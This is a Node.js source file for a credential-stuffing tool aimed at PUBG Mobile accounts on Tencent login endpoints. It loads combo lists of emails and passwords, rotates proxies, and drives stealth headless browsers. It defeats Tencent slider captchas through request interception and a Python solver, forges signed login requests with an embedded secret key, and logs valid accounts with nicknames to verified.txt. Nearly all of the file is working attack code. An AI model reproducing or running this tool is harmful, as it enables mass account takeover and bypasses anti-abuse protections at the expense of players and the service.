const puppeteer = require('puppeteer-extra')
const axios = require('axios');
const crypto = require('crypto');
const { URLSearchParams } = require('url');
const uuid = require('uuid');
const { randomBytes } = require('crypto');
const { executablePath } = require('puppeteer')
const fs = require('fs')
const path = require('path');
const { spawn, spawnSync } = require('child_process');
const StealthPlugin = require('puppeteer-extra-plugin-stealth')

puppeteer.use(StealthPlugin())

let python = 'python3';
const args = process.argv.slice(2);
const BROWSER_COUNT = parseInt(args[1]) || 1;
const PAGE_COUNT = parseInt(args[2]) || 1;
const userAgent = "Mozilla/5.0 (Linux; Android 7.1.2; SM-G955N Build/NRD90M.G955NKSU1AQDC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36";
const secret_key = "3ec8cd69d71b7922e2a17445840866b26d86e283";
const user_agent_list = ["Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv", "Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817", "Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv", "Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv", "Linux; Android 9; SM-G973U Build/PPR1.180610.011", "Linux; Android 8.0.0; SM-G960F Build/R16NW", "Linux; Android 7.0; SM-G892A Build/NRD90M; wv", "Linux; Android 7.0; SM-G930VC Build/NRD90M; wv", "Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv", "Linux; Android 6.0.1; SM-G920V Build/MMB29K", "Linux; Android 5.1.1; SM-G928X Build/LMY47X"]

if (!args[0]) {
    console.log("Example usage: \nnode run.js accounts-filename BROWSER-COUNT PAGE-COUNT\nnode run.js combo_list.txt 2 10")
    process.exit(1);
}

checkPythonInstallationSync();

function checkPythonInstallationSync() {
    const python3Check = spawnSync('python3', ['--version']);
    if (python3Check.status === 0) {
        python = "python3";
    } else {
        const pythonCheck = spawnSync('python', ['--version']);
        if (pythonCheck.status === 0) {
            python = "python";
        } else {
            console.error(`Python not found: ${pythonCheck.stderr.toString().trim()}\ninstall python then run: \n\tpip install -r requirements.txt`);
        }
    }
}

const hash = (passwd) => {
    return crypto.createHash('md5').update(passwd, 'utf-8').digest('hex');
};

const generateValidKey = (url) => {
    const urlParams = new URLSearchParams(new URL(url).search);
    let sortedParams = new URLSearchParams();
    urlParams.forEach((value, key) => {
        sortedParams.append(key, value);
    });
    sortedParams = new URLSearchParams([...sortedParams.entries()].sort());
    let s_key = '';
    sortedParams.forEach(value => {
        s_key += value;
    });
    s_key += secret_key;
    return crypto.createHash('md5').update(s_key).digest('hex');
};

async function sendRequestWithRetry(url, config, maxRetries = 5) {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const response = await axios(url, config);
            return response;
        } catch (error) {
            console.error(`Request error (Try ${attempt}):`, error.message);
            if (attempt === maxRetries) {
                throw error;
            }
        }
    }
}

function extractJsonFromString(str) {
    const match = str.match(/\(([^)]+)\)/);
    if (match && match[1]) {
        try {
            const json = JSON.parse(match[1]);
            return json;
        } catch (e) {
            console.error('JSON parsing error:', e);
        }
    }
    return null;
}

function readAndProcessAccountList(filePath) {
    const content = fs.readFileSync(filePath, 'utf-8');
    const lines = content.split('\n');
    const credentials = lines
        .map(line => line.trim().split(':'))
        .filter(parts => parts.length === 2 && parts[0].includes('@'));
    return credentials;
}

function readProxyList(filePath) {
    const content = fs.readFileSync(filePath, 'utf-8');
    const lines = content.split('\n');
    const proxies = lines
        .map(line => line.trim().split(':'))
        .filter(parts => parts.length === 4);
    return proxies;
}

const emailPasswordPairs = readAndProcessAccountList(args[0]);
const proxies = readProxyList("./proxies.txt").map(p => { return { username: p[0], password: p[1], host: p[2], port: p[3] } });

function getNextProxy() {
    const proxy = proxies.shift();
    proxies.push(proxy);
    return proxy;
}
function getNextCredential() {
    if (emailPasswordPairs.length === 0) {
        return null;
    }
    return emailPasswordPairs.shift();
}

async function getBrowser(proxy) {
    const browser = await puppeteer.launch({
        headless: "new",
        executablePath: executablePath(),
        ignoreHTTPSErrors: true,
        args: [
            `--proxy-server=${proxy.host}:${proxy.port}`,
            `--proxy-auth=${proxy.username}:${proxy.password}`
        ]
    });

    const getNewPage = async (oldCredential) => {
        const credential = oldCredential || getNextCredential();
        if (!credential) return;

        let page = await browser.newPage();
        page.credential = credential;
        page.proxy = proxy
        await page.setRequestInterception(true);

        page.on('requestfailed', request => {
            if (page.reloading || page.isClosed()) return;
            if (
                request.url().includes("cap_union_new_verify") ||
                request.url().includes("cap_union_new_getsig") ||
                request.url().includes("cap_union_prehandle")
            ) {
                setTimeout(() => {
                    if (page.reloading || page.isClosed()) return;
                    page.reloadCaptcha();
                }, 100);
            }
        });

        page.on('response', async response => {
            if (!page.credential) return;
            if (page.reloading || page.isClosed()) return;

            const responseUrl = response.url();

            if (responseUrl.includes("cap_union_prehandle")) {
                const responseData = await response.text();
                const responseJson = extractJsonFromString(responseData);
                if (!responseJson) {
                    page.reloadCaptcha();
                    return;
                }

                const pythonProcess = spawn(python, ['./crack_tencent_captcha.py', JSON.stringify(responseJson), `http://${page.proxy.username}:${page.proxy.password}@${page.proxy.host}:${page.proxy.port}`]);

                pythonProcess.stdout.once('data', async (data) => {
                    const dis = parseFloat(data);
                    if (page.isClosed() || page.reloading) return;
                    let frameElement;
                    let frame;
                    try {
                        frameElement = await page.waitForSelector('#tcaptcha_iframe_dy', { timeout: 10000 });
                        frame = await frameElement.contentFrame();
                        await frame.waitForSelector('.tc-slider-normal', { timeout: 10000 });

                        await frame.waitForTimeout(100);
                        await frame.evaluate((selector, offsetX, offsetY) => {
                            const element = document.querySelector(selector);
                            if (!element) {
                                throw new Error(`Element ${selector} not found`);
                            }

                            offsetX += 10;

                            const createMouseEvent = (type, x, y) => {
                                const event = new MouseEvent(type, {
                                    bubbles: true,
                                    cancelable: true,
                                    view: window,
                                    clientX: x,
                                    clientY: y
                                });
                                return event;
                            };

                            const rect = element.getBoundingClientRect();
                            const startX = rect.left + window.scrollX;
                            const startY = rect.top + window.scrollY;


                            element.dispatchEvent(createMouseEvent('mousedown', startX, startY));
                            element.dispatchEvent(createMouseEvent('mousemove', startX + offsetX, startY + offsetY));
                            element.dispatchEvent(createMouseEvent('mouseup', startX + offsetX, startY + offsetY));
                        }, '.tc-slider-normal', dis, 0);
                    } catch (error) {
                        console.error("element not found");
                        page.reloadCaptcha();
                        return;
                    }

                });

                pythonProcess.stderr.on('data', (data) => {
                    console.log("Python error: ", data.toString());
                    page.reloadCaptcha();
                });
            }
            else if (responseUrl.includes("cap_union_new_verify")) {
                let verifyData;
                try {
                    verifyData = await response.json();
                } catch (error) {
                    console.error("CAPTCHA ERROR");
                    page.reloadCaptcha();
                    return;
                }
                // console.log(verifyData);
                if (verifyData.ticket) {
                    console.log("CAPTCHA SUCCESS");
                    const captchaToken = verifyData.ticket;
                    const captchaRandstr = verifyData.randstr;
                    const mail = page.credential[0];
                    const password = page.credential[1];

                    const headers = {
                        "User-Agent": `Dalvik/2.1.0 (${user_agent_list[Math.floor(Math.random() * user_agent_list.length)]})`,
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip, deflate, br",
                    };

                    const hashedPassword = hash(password);
                    const loginSig = hash(`/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{"account":"${mail}","account_type":1,"area_code":"","extra_json":"","password":"${hashedPassword}","qcaptcha":{"ret": 0, "msg": "success", "randstr": "${captchaRandstr}", "ticket": "${captchaToken}"}}${secret_key}`);
                    const loginUrl = `https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig=${loginSig}`;
                    const loginData = `{"account":"${mail}","account_type":1,"area_code":"","extra_json":"","password":"${hashedPassword}","qcaptcha":{"ret": 0, "msg": "success", "randstr": "${captchaRandstr}", "ticket": "${captchaToken}"}}`;
                    const proxy = undefined;
                    // {
                    //     protocol: 'http',
                    //     host: page.proxy.host,
                    //     port: page.proxy.port,
                    //     auth: {
                    //       username: page.proxy.username,
                    //       password: page.proxy.password
                    //     }
                    // }
                    sendRequestWithRetry(loginUrl, {
                        data: loginData,
                        headers: headers,
                        proxy
                    }).then((loginRes) => {
                        const loginResJson = loginRes.data;
                        const loginToken = loginResJson.token;
                        const loginUid = loginResJson.uid;
                        const did = uuid.v4();
                        const dinfo = encodeURIComponent(`1|28602|${["G011A", "SM-S906N", "SM-G996U", "SM-G980F", "SM-G973U", "SM-G960F", "SM-G892A", "SM-G930VC", "SM-G935S", "SM-G928X", "J8110", "G8231", "E6653"][Math.floor(Math.random() * 13)]}|tr|2.6.0|${Math.floor(Date.now())}|1.5|1280*730|google`);
                        const gid = randomBytes(16).toString('hex');
                        const sValidKey = generateValidKey(`https://ig-us-sdkapi.igamecj.com/v1.0/user/login?did=${did}&dinfo=${dinfo}&iChannel=42&iGameId=1320&iPlatform=2&sGuestId=${gid}&sOriginalId=${gid}&sRefer=&token=${encodeURIComponent(loginToken)}&uid=${loginUid}`);
                        const login2Url = `https://ig-us-sdkapi.igamecj.com/v1.0/user/login?did=${did}&dinfo=${dinfo}&iChannel=42&iGameId=1320&iPlatform=2&sGuestId=${gid}&sOriginalId=${gid}&sRefer=&sValidKey=${sValidKey}&token=${encodeURIComponent(loginToken)}&uid=${loginUid}`;

                        sendRequestWithRetry(login2Url, { headers, proxy }).then((login2Res) => {
                            if (login2Res.data.desc === "SUCCESS") {
                                console.log("ACCOUNT FOUND", mail, password);

                                let ticketUrl = `https://ig-us-sdkapi.igamecj.com/v1.0/user/getTicket?did=${did}&dinfo=${dinfo}&iChannel=42&iGameId=1320&iOpenid=${login2Res.data.iOpenid}&iPlatform=2&sGuestId=${gid}&sInnerToken=${login2Res.data.sInnerToken}&sOriginalId=${gid}&sRefer=`
                                const sValidKey2 = generateValidKey(ticketUrl)
                                ticketUrl = `${ticketUrl}&sValidKey=${sValidKey2}`
                                sendRequestWithRetry(ticketUrl, { headers, proxy }).then((ticketRes) => {
                                    sendRequestWithRetry("https://pubg-sg-community.playerinfinite.com/api/gpts.auth_svr.AuthSvr/LoginByItopTicket", {
                                        method: "post",
                                        data: {
                                            "partition": "3",
                                            "game_area": "1",
                                            "plat_id": "3",
                                            "clienttype": "903",
                                            "mappid": "10109",
                                            "sticket": ticketRes.data.sTicket
                                        },
                                        headers: {
                                            "Accept": "application/json, text/plain, */*",
                                            "Accept-Encoding": "gzip, deflate",
                                            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                                            "Connection": "keep-alive",
                                            "Content-Type": "application/json",
                                            "Host": "pubg-sg-community.playerinfinite.com",
                                            "Origin": "https://pubg-sg-community.playerinfinite.com",
                                            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-S908N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
                                            "X-AreaId": "",
                                            "X-GameId": "7",
                                            "X-Requested-With": "com.tencent.ig"
                                        },
                                        proxy
                                    }).then((accountInfoRes) => {
                                        fs.appendFile('verified.txt', `${mail}:${password}:${accountInfoRes.data.data.user_info.nick}\n`, (err) => {
                                            if (err) console.log(err);
                                        });

                                        page.credential = null;
                                        page.reloadCaptcha();
                                    }).catch((error) => {
                                        fs.appendFile('verified.txt', `${mail}:${password}\n`, (err) => {
                                            if (err) console.log(err);
                                        });

                                        page.credential = null;
                                        page.reloadCaptcha();
                                    })

                                }).catch((ticketError) => {
                                    fs.appendFile('verified.txt', `${mail}:${password}\n`, (err) => {
                                        if (err) console.log(err);
                                    });

                                    page.credential = null;
                                    page.reloadCaptcha();
                                })
                            }
                            else {

                                console.log("ACCOUNT NOT FOUND", page.credential);
                                page.credential = null;
                                page.reloadCaptcha();
                            }
                        }).catch((error) => {

                            page.credential = null;
                            page.reloadCaptcha();
                        });
                    }).catch((error) => { });
                }
                else {
                    console.error("CAPTCHA ERROR", verifyData.errorCode);
                    page.reloadCaptcha();
                }
            }
        });

        page.on('request', async (request) => {
            if (request.url().includes("drag_ele_global")) {
                request.respond({
                    status: 200,
                    contentType: 'text/html',
                    body: fs.readFileSync("./tencent-captcha/template/drag_ele_global.html", "utf8"),
                });
            }
            else if (request.url().includes("Captcha.js")) {
                request.respond({
                    status: 200,
                    contentType: 'application/javascript',
                    body: fs.readFileSync("./tencent-captcha/Captcha.js", "utf8"),
                });
            }
            else if (request.url().includes("dy-ele.b2eedcdd.js")) {
                request.respond({
                    status: 200,
                    contentType: 'application/javascript',
                    body: fs.readFileSync("./tencent-captcha/dy-ele.b2eedcdd.js", "utf8"),
                });
            }
            else if (request.url().includes("dy-jy.js")) {
                request.respond({
                    status: 200,
                    contentType: 'application/javascript',
                    body: fs.readFileSync("./tencent-captcha/dy-jy.js", "utf8"),
                });
            }
            else if (request.url().includes(".com/tcaptcha-frame.28d99140.js")) {
                request.respond({
                    status: 200,
                    contentType: 'application/javascript',
                    body: fs.readFileSync("./tencent-captcha/tcaptcha-frame.28d99140.js", "utf8"),
                });
            }
            else if (request.url().includes("cap_union_new_getcapbysig?img_index=1")) {
                request.respond({
                    status: 200,
                    contentType: 'image/png',
                    body: fs.readFileSync("./tencent-captcha/cap_union_new_getcapbysig.png"),
                });
            }
            else if (request.url().includes("cap_union_new_getcapbysig?img_index=0")) {
                request.respond({
                    status: 200,
                    contentType: 'image/png',
                    body: fs.readFileSync("./tencent-captcha/slider.png"),
                });
            }
            else {
                request.continue();
            }
        });

        await page.setUserAgent(userAgent);
        await page.goto(`file:///${path.join(__dirname, "tencent-captcha", "verify.html")}`)
        page.reloading = false;
        await page.authenticate({
            username: proxy.username,
            password: proxy.password,
        });

        page.reloadCaptcha = async () => {
            if (!page.isClosed() && !page.reloading) {
                page.reloading = true;
                await page.reload();
                page.reloading = false;

                const credential = page.credential || getNextCredential();

                if (!credential && (await browser.pages()).filter(p => p.credential).length === 0) {
                    browser.close();
                }
                page.credential = credential;
            }
        }
        return page;
    }

    for (let index = 0; index < PAGE_COUNT; index++) {
        await getNewPage();
    }
    const pages = await browser.pages();
    if (pages.length > 0) {
        await pages[0].close();
    }
    return browser;
}

(async () => {
    for (let index = 0; index < BROWSER_COUNT; index++) {
        const proxy = getNextProxy();
        await getBrowser(proxy);
    }
})();


process.on('uncaughtException', (e) => { console.log(e); })
process.on('unhandledRejection', (e) => { console.log(e); })